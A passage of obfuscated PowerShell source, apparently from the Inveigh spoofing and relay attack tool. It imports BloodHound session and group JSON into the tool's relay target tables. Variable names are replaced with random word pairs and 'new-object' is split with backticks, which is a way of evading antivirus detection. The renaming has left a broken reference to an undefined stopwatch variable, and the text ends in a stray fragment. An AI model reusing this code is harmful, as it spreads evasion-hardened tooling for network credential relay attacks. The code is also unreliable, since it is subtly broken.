                        Write-TableSteam "[-] DNS lookup for $OrderSteam failed or IPv6 address"
                    }

                }

            }

            if(!$MarketAsk -or $SuperRigid -ge 0)
            {
                [Array]$SmallRoyal = $LightOval.enumerate[$SuperRigid].Sessions

                if($SmallRoyal -notcontains $_.UserName)
                {
                    $SmallRoyal += $_.UserName
                    $LightOval.enumerate[$SuperRigid].Sessions = $SmallRoyal
                }

            }
            else
            {   
                $LightOval.enumerate.Add($(New-RelayEnumObject -OrderSteam $OrderSteam -SmashDolls $SmashDolls -RainyShave $_.UserName)) > $null
            }

            $OrderSteam = $null
            $SmashDolls = $null
            $SmallRoyal = $null
            $SuperRigid = $null
            $ColorReply++
        }

        Write-TableSteam "[+] Import completed in $([Math]::Truncate($SonEgg.Elapsed.TotalSeconds)) seconds"
        $SonEgg.Reset()
        Remove-Variable bloodhound_sessions
    }
    
    if($RoughGate)
    {
        $RoughGate = (Resolve-Path $RoughGate).Path
        $DaffyLaugh = ne`w-`obje`ct -TypeName System.Web.Script.Serialization.JavaScriptSerializer
        $DaffyLaugh.MaxJsonLength = 104857600
        $HomeLight = [System.IO.File]::ReadAllText($RoughGate)
        $HomeLight = $DaffyLaugh.DeserializeObject($HomeLight)
        $SonEgg = [System.Diagnostics.Stopwatch]::StartNew()
        Write-TableSteam "[*] Parsing BloodHound Groups JSON"
        $HomeLight = Invoke-ParseItem $HomeLight
        Write-TableSteam "[+] Parsing completed in $([Math]::Truncate($SonEgg.Elapsed.TotalSeconds)) seconds"
        $SonEgg.Reset()
        $SonEgg.Start()
        Write-TableSteam "[*] Importing groups to Inveigh"
        $SuddenIcicle = [System.Diagnostics.Stopwatch]::StartNew()
        $ColorReply = 0

        if(!$HomeLight.Groups)
        {
            Write-TableSteam "[!] JSON groups parse failed"
            throw
        }
        
        $HomeLight.Groups | ForEach-Object {

            if($SuddenIcicle.Elapsed.TotalMilliseconds -ge 500)
            {
                $PetiteSail = [Math]::Truncate($ColorReply / $HomeLight.Groups.Count * 100)

                if($PetiteSail -le 100)
                {
                    Write-Progress -Activity "[*] Importing groups" -Status "$PetiteSail% Complete:" -PercentComplete $PetiteSail -ErrorAction SilentlyContinue
                }

                $SuddenIcicle.Reset()
                $SuddenIcicle.Start()
            }

            [Array]$FriendOffend = $_.Members | Select-Object -expand MemberName
            $LightOval.group_table.Add($_.Name,$FriendOffend)
            $FriendOffend = $null
            $ColorReply++
        }

        Write-TableSteam "[+] Import completed in $([Math]::Truncate($FastenTrick.Elapsed.TotalSeconds)) seconds"
    }

}

# Microsoft".